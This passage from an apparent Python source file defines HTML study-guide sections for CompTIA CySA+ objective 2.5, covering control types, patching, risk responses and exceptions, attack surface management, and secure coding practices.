""" + T.format("A completed scan is not a reduced risk. If the findings aren&rsquo;t prioritized, fixed and rescanned, the program hasn&rsquo;t done its job.")),

dict(id="control-types", o="2.5", t="Control types and compensating controls", q="compensating", h="""
<p>Two different ways to classify the same control:</p>
<div class="tblwrap"><table><tr><th>By category (who/what implements it)</th><th>By function (what it does)</th></tr>
<tr><td><strong>Managerial</strong>: policy, risk assessment, governance</td><td><strong>Preventative</strong>: stops an incident (firewall rule, MFA)</td></tr>
<tr><td><strong>Operational</strong>: carried out by people (training, guards, change procedures)</td><td><strong>Detective</strong>: finds an incident (IDS, log review, FIM)</td></tr>
<tr><td><strong>Technical</strong>: implemented in technology (encryption, ACLs, EDR)</td><td><strong>Responsive</strong>: acts during an incident (IR team, automated containment)</td></tr>
<tr><td></td><td><strong>Corrective</strong>: restores after an incident (restore from backup, patch)</td></tr></table></div>
<p>A <strong>compensating control</strong> provides comparable protection when the required control can&rsquo;t be used, for example isolating an unpatchable legacy server on its own VLAN behind an allow-list firewall. It needs documenting and periodic review.</p>
<p><strong>Class vocabulary vs. CompTIA&rsquo;s.</strong> The course groups controls as <em>administrative, physical and technical</em>, with seven functions: directive, deterrent, preventive, compensating, detective, corrective and recovery. CS0-003 objective 2.5 uses <strong>managerial, operational and technical</strong>, and <strong>preventative, detective, responsive and corrective</strong>. They map closely: administrative &asymp; managerial; physical controls such as guards and locks are usually counted as operational or physical depending on the source; recovery sits under corrective. On the exam, use CompTIA&rsquo;s words.</p>
""" + T.format("Category and function are separate questions. A firewall is technical (category) and preventative (function). Read whether the question asks &ldquo;type&rdquo; meaning category or function.")),

dict(id="patching", o="2.5", t="Patching, configuration and maintenance windows", q="rollback", h="""
<p>Patch life cycle: <strong>testing</strong> (in a staging environment that mirrors production) &rarr; <strong>implementation</strong> (through change management, in a <strong>maintenance window</strong> agreed with the business) &rarr; <strong>rollback</strong> plan ready if it breaks something &rarr; <strong>validation</strong> (rescan or check the version to prove the fix applied).</p>
<p>Maintenance windows are scheduled periods when downtime is acceptable. Emergency patches for actively exploited flaws can justify an out-of-band window through an emergency change.</p>
""" + T.format("Remediation isn&rsquo;t finished when the patch is deployed. It&rsquo;s finished when a rescan validates the vulnerability is gone.")),

dict(id="risk-exceptions", o="2.5", t="Risk responses, exceptions, policy and SLOs", q="risk acceptance", h="""
<div class="tblwrap"><table><tr><th>Response</th><th>Meaning</th><th>Example</th></tr>
<tr><td><strong>Mitigate</strong></td><td>Reduce likelihood or impact</td><td>Patch, add a WAF rule</td></tr>
<tr><td><strong>Transfer</strong></td><td>Shift financial impact to someone else</td><td>Cyber insurance, outsourcing with contractual liability</td></tr>
<tr><td><strong>Avoid</strong></td><td>Stop the risky activity</td><td>Retire the vulnerable service</td></tr>
<tr><td><strong>Accept</strong></td><td>Knowingly live with it</td><td>Cost of fixing exceeds the risk; signed off by the risk owner</td></tr></table></div>
<p><strong>Exceptions</strong> formalize acceptance for a specific finding: what the risk is, why it can&rsquo;t be fixed, which compensating controls apply, who approved it, and an expiry or review date.</p>
<p><strong>Policies and governance</strong> set the rules: remediation timeframes by severity, who can approve exceptions. <strong>SLOs</strong> are the measurable targets, such as &ldquo;critical vulnerabilities on internet-facing systems fixed within 7 days&rdquo;. <strong>Prioritization and escalation</strong>: anything that misses its SLO, or is actively exploited, escalates to management.</p>
""" + T.format("Insurance transfers financial loss, not the risk itself. You still suffer the breach.")),

dict(id="attack-surface", o="2.5", t="Attack surface management", q="bug bounty", h="""
<ul><li><strong>Edge discovery</strong>: find everything you expose to the internet, including forgotten subdomains, cloud instances and shadow IT (certificate transparency logs, DNS enumeration, internet-wide scan data).</li>
<li><strong>Passive discovery</strong>: map assets without touching them, from DNS records, traffic monitoring and public data.</li>
<li><strong>Security controls testing</strong>: verify controls actually work (does the WAF block this payload? does the EDR alert on this technique?).</li>
<li><strong>Penetration testing</strong> exploits weaknesses to show real impact, within an agreed scope. <strong>Adversary emulation</strong> mimics a specific threat actor&rsquo;s known TTPs (often mapped to ATT&amp;CK) to test detection. Red team attacks, blue team defends, purple team works together.</li>
<li><strong>Bug bounty</strong>: pay outside researchers for verified findings under published rules.</li>
<li><strong>Tools that automate this</strong>: <strong>CAASM</strong> (cyber asset attack surface management) builds one inventory from all your existing tools; <strong>RBVM</strong> (risk-based vulnerability management) ranks findings by exploitability and business impact rather than CVSS alone; <strong>CRQ</strong> (cyber risk quantification) expresses risk in money so leaders can compare it with other business risks.</li>
<li><strong>Attack surface reduction</strong>: remove what isn&rsquo;t needed, such as unused services, open ports, stale accounts and old DNS records.</li></ul>
"""),

dict(id="secure-coding", o="2.5", t="Secure coding, SDLC and threat modeling", q="input validation", h="""
<div class="tblwrap"><table><tr><th>Practice</th><th>Defends against</th></tr>
<tr><td><strong>Input validation</strong> (server-side, allow-list)</td><td>Injection, traversal, overflows</td></tr>
<tr><td><strong>Output encoding</strong> (context-aware escaping)</td><td>XSS</td></tr>
<tr><td><strong>Session management</strong> (random IDs, secure/HttpOnly/SameSite cookies, timeouts, new ID after login)</td><td>Session hijacking, fixation, CSRF</td></tr>
<tr><td><strong>Authentication</strong> (MFA, lockout/rate limits, strong hashing)</td><td>Credential stuffing, brute force</td></tr>
<tr><td><strong>Data protection</strong> (encrypt in transit and at rest, minimize stored data)</td><td>Cryptographic failures, data exposure</td></tr>
<tr><td><strong>Parameterized queries</strong></td><td>SQL injection</td></tr></table></div>
<p><strong>Secure SDLC</strong> builds security into each phase: requirements, design (threat modeling), development (secure coding, code review, SAST), testing (DAST, fuzzing), deployment (hardening), maintenance (patching, monitoring). Finding flaws early is far cheaper than after release.</p>
<p>Two common references for secure coding: the <strong>OWASP</strong> Top 10 for web applications and the <strong>CWE/SANS Top 25</strong> most dangerous software weaknesses. <strong>DevSecOps</strong> puts the security checks (SAST, dependency scanning, DAST) into the CI/CD pipeline so they run on every change.</p>
<p><strong>Threat modeling</strong> asks what can go wrong before you build. STRIDE is a common method: Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege.</p>
"""),
]
